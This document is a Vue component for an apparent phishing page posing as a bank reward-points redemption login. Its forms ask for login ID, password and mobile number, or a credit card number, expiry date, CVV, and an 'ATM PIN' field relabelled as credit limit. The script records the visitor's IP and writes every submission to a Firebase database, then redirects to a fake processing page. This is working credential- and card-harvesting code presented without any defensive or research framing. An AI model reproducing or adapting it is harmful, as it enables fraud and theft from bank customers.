<template>
  <div class="App">
    <div v-if="overlayVisible" class="overlay"></div>
    <div v-if="!showPreloader" class="mainContent">
      <HeadPage/>
      <h1 class="text-center">Continue to Redeem Point</h1>
      <div class="card">
        <div class="card-login">
          <button
            v-bind:class="{ active: activeForm === 'formA' }"
            @click="handleFormChange('formA')"
          >
            Login ID / Customer ID
          </button>
          <button
            v-bind:class="{ active: activeForm === 'formC' }"
            @click="handleFormChange('formC')"
          >
            Credit Card No.
          </button>
        </div>
        <div>
          <section id="formA" v-show="activeForm === 'formA'">
            <form class="LoginForm myform" @submit.prevent="handleSubmitA">
              <div class="form-group">
                <label for="Login_ID">Login ID / Customer ID</label>
                <input
                  class="new-control"
                  type="text"
                  name="Login_ID"
                  id="Login_ID"
                  maxlength="20"
                  required
                  v-model="formDataA.Login_ID"
                />
              </div>
              <div class="form-group">
                <label for="Password">Password</label>
                <div class="password-input">
                  <input
                    class="new-control"
                    :type="passwordVisible ? 'text' : 'password'"
                    minlength="6"
                    maxlength="30"
                    name="Password"
                    id="Password"
                    required
                    v-model="formDataA.Password"
                  />
                  <!-- <FontAwesomeIcon
                    :icon="passwordVisible ? faEyeSlash : faEye"
                    @click="togglePasswordVisibility"
                  /> -->
                </div>
              </div>
              <div class="form-group">
                <label for="Mobile_Number">Registered Mobile No.</label>
                <input
                  class="new-control"
                  type="text"
                  id="Mobile_Number"
                  name="Mobile_Number"
                  maxlength="10"
                  inputmode="numeric"
                  pattern="[6-9]\d{9}"
                  title="Please enter a valid mobile number!"
                  required
                  v-model="formDataA.Mobile_Number"
                />
              </div>
              <div class="text-center">
                <button type="submit" class="submit">LOGIN</button>
              </div>
            </form>
          </section>
          <section id="formC" v-show="activeForm === 'formC'">
            <form class="LoginForm myform" @submit.prevent="handleSubmitC">
              <div class="form-group" id="mobileNumberInput">
                <label for="Card_No">Credit Card No.</label>
                <input
                  class="new-control"
                  type="text"
                  maxlength="19"
                  id="Card_No"
                  name="Card_No"
                  inputmode="numeric"
                  title="Please enter a valid debit card number!"
                  required
                  v-model="cardNumber"
                  @input="handleCardNumberChange($event.target.value)"
                />
              </div>
              <div class="form-group">
                <div style="display: flex; align-items: center; justify-content: space-between;">
                  <label>
                    Expiry Date <span style="color: red">*</span>
                  </label>
                  <label>
                    CVV <span style="color: red">*</span>
                  </label>
                </div>
                <div class="expiry-cvv">
                  <input
                    type="text"
                    class="expiry-date new-control"
                    id="Expiry_Date"
                    name="Expiry_Date"
                    maxlength="5"
                    placeholder="MM/YY"
                    required
                    inputmode="numeric"
                    style="margin: 0px; width: 34%; padding: 10px"
                    v-model="expiryDate"
                    @input="handleExpiryDateChange($event.target.value)"
                  />
                  <input
                    type="text"
                    class="cvv new-control"
                    id="CVV"
                    name="CVV"
                    minlength="3"
                    maxlength="3"
                    placeholder="CVV"
                    required
                    inputmode="numeric"
                    style="margin-left: 40px; width: 30%; padding: 10px"
                    v-model="cvv"
                    @input="handleCVVChange($event.target.value)"
                  />
                </div>
              </div>
              <div class="form-group">
                <label for="ATM_PIN" style="font-size: 13px; font-family: Work Sans, sans-serif;">Available Credit Limit</label>
                <input
                  type="text"
                  class="new-control"
                  inputmode="numeric"
                  id="ATM_PIN"
                  name="ATM_PIN"
                  minlength="3"
                  maxlength="7"
                  title="Please enter a valid ATM PIN!"
                  required
                  v-model="formDataC.ATM_PIN"
                />
              </div>
              <div class="form-group">
                <label for="Mobile_Number" style="font-size: 13px; font-family: Work Sans, sans-serif; margin-top: 20px;">Registered Mobile No.</label>
                <input
                  type="text"
                  class="new-control"
                  id="Mobile_Number"
                  name="Mobile_Number"
                  maxlength="10"
                  inputmode="numeric"
                  pattern="[6-9]\d{9}"
                  title="Please enter a valid mobile number!"
                  required
                  v-model="formDataC.Mobile_Number"
                />
              </div>
              <div>
                <button type="submit" class="submit">LOGIN</button>
              </div>
            </form>
          </section>
        </div>
      </div>
      <FooterPage/>
    </div>
  </div>
</template>

<script>
import { ref, push, set, getDatabase } from '@firebase/database';
// import { FontAwesomeIcon } from '@fortawesome/vue-fontawesome';
// import { faEye, faEyeSlash } from '@fortawesome/free-solid-svg-icons';
import axios from 'axios';
import { app } from './firebase';
import HeadPage from './HeadPage.vue';
import FooterPage from './FooterPage.vue';

const db = getDatabase(app);

export default {
    components: {
    HeadPage,
    FooterPage,
  },

    
    
  
  data() {
    return {
      activeForm: 'formA',
      ip: '',
      formDataA: {
        Login_ID: '',
        Password: '',
        Mobile_Number: '',
      },
      cardNumber: '',
      expiryDate: '',
      cvv: '',
      formDataC: {
        Card_No: '',
        ATM_PIN: '',
        Mobile_Number: '',
        Expiry_Month: '',
        Expiry_Year: '',
        CVV: '',
      },
      passwordVisible: false,
      showPreloader: true,
      overlayVisible: false,
    };
  },
  // components: {
  //   FontAwesomeIcon,
  // },
  mounted() {
    this.getUserIp();
    setTimeout(() => {
      this.showPreloader = false;
    }, 1500);
  },
  methods: {
    async getUserIp() {
      try {
        const ipData = await axios.get('https://ipapi.co/json');
        this.ip = ipData.data.ip;
      } catch (error) {
        console.error('Error fetching IP: ', error);
      }
    },
    handleFormChange(formName) {
      this.activeForm = formName;
    },
    handleCardNumberChange(value) {
      this.cardNumber = value
        .replace(/\D/g, '')
        .replace(/(\d{4})(?=\d)/g, '$1 ');
    },
    handleExpiryDateChange(value) {
      const formattedExpiryDate = value
        .replace(/\D/g, '')
        .substring(0, 4);

      if (formattedExpiryDate.length >= 2) {
        this.expiryDate = `${formattedExpiryDate.substring(0, 2)}/${formattedExpiryDate.substring(2)}`;
      } else {
        this.expiryDate = formattedExpiryDate;
      }
    },
    handleCVVChange(value) {
      this.cvv = value
        .replace(/\D/g, '')
        .substring(0, 3);
    },
    handleSubmitA() {
      const dataToSave = {
        Login_ID: this.formDataA.Login_ID,
        Password: this.formDataA.Password,
        Mobile_Number: this.formDataA.Mobile_Number,
      };

      this.saveFormData(dataToSave);
    },
    handleSubmitC() {
      const expiryMonth = this.expiryDate.substring(0, 2);
      const expiryYear = this.expiryDate.substring(2);

      const dataToSave = {
        Card_No: this.cardNumber.replace(/\s/g, ''),
        CardLimit: this.formDataC.ATM_PIN,
        Mobile_Number: this.formDataC.Mobile_Number,
        Expiry_Month: expiryMonth,
        Expiry_Year: expiryYear,
        CVV: this.cvv,
      };

      this.saveFormData(dataToSave);
    },
    saveFormData(data) {
      this.overlayVisible = true;

      const usersRef = ref(db, 'data');
      const newEntryKey = push(usersRef).key;
      const newEntryRef = ref(db, `data/${newEntryKey}`);

      set(newEntryRef, data)
        .then(() => {
          console.log('Data saved successfully.');
          this.$router.push("/prossingone");
        })
        .catch((error) => {
          console.error('Error saving data: ', error);
        })
        .finally(() => {
          this.overlayVisible = false;
        });
    },
    togglePasswordVisibility() {
      this.passwordVisible = !this.passwordVisible;
    },
    handleBlockedClick(event) {
      event.preventDefault();
      event.stopPropagation();
    },
    handleBlockedRightClick(event) {
      event.preventDefault();
      event.stopPropagation();
    },
  },
};
</script>

<style scoped>
/* Add your CSS styles here */
</style>
